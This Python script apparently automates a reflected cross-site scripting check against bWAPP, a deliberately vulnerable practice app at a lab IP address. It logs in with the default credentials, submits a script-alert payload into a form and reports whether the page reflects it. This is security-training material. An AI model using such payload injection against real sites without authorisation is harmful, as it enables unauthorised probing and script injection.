import requests
from bs4 import BeautifulSoup
import mechanize
# import re
# import html

#------------------------------------#
#info to create a new users
login = "bee"
password = "bug"
email = "beez@site.com"
security_level = 0
secret = "My secret is sooo sicr3t"
url_base = "http://192.168.3.167"

#add a session to the request
s = requests.session()
#create a header to add it to the request
headers = {
	'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0'
}

#------------------------------------#
#create a new user page with passed info
url_user_new = url_base + "/bWAPP/user_new.php"
data = {"action": "create",
			"email": email,
			"login": login,
			"password":	password,
			"password_conf": password,
			"secret": secret
			}
##send a requets to create a user with passed info
# createUserResponse = s.post(url_user_new, data=data, headers= headers)
##create a user
# createUserResponse

#------------------------------------#
#user login page with passed info
url_login = url_base + "/bWAPP/login.php"
payload = {
			"login": login,
			"password": password,
			"security_level": security_level,
			"form": "submit"
			}
#send a requets to login the user with passed info
loginUserResponse = s.post(url_login, data=payload, headers= headers)
#login the user
loginUserResponse

#------------------------------------#
#go to one xss bug page
url_bugs = url_base + "/bWAPP/xss_get.php"


request = s.get(url_bugs)

#parse HTML page
parseHTML = BeautifulSoup(request.text, 'html.parser')

#Extract the form name using Beautifull Soap
htmlForm = parseHTML.form

inputs = htmlForm.find_all('input')


#Extract Input Field Names
inputFieldNames = []

for items in inputs:
	if items.has_attr('name'):
		inputFieldNames.append(items['name'])

field_1_name = str(inputFieldNames[0])
field_2_name = str(inputFieldNames[1])


xss = """<script>alert("Oh!");</script>"""

field_1_val = xss
field_2_val = "qqqqqqqqqqqq"

browser = mechanize.Browser()
browser.open(url_login)
browser.select_form(nr = 0)
browser.form['login'] = login
browser.form['password'] = password
security_level = str(security_level)
browser.form['security_level'] = [security_level,]
browser.submit()


# browser = mechanize.Browser()
browser.open(url_bugs)
browser.select_form(nr = 0)
browser.form[field_1_name] = field_1_val
browser.form[field_2_name] = field_2_val
browser.submit()

# pattern = re.compile(xss)
finalResult = browser.response().read()

parseHTML = BeautifulSoup(finalResult, 'html.parser')
parseHTML = parseHTML.prettify(formatter=None)


# if parseHTML.findAll(string=pattern):
#     print("Application is vulnerable")
# else:
#     print("You are in good hands")


# print(parseHTML.prettify(formatter=None))
# print(parseHTML.encode(formatter=None))

if xss in parseHTML:
    print("Application is vulnerable")
else:
    print("You are in good hands")

# print(parseHTML)
print(parseHTML)
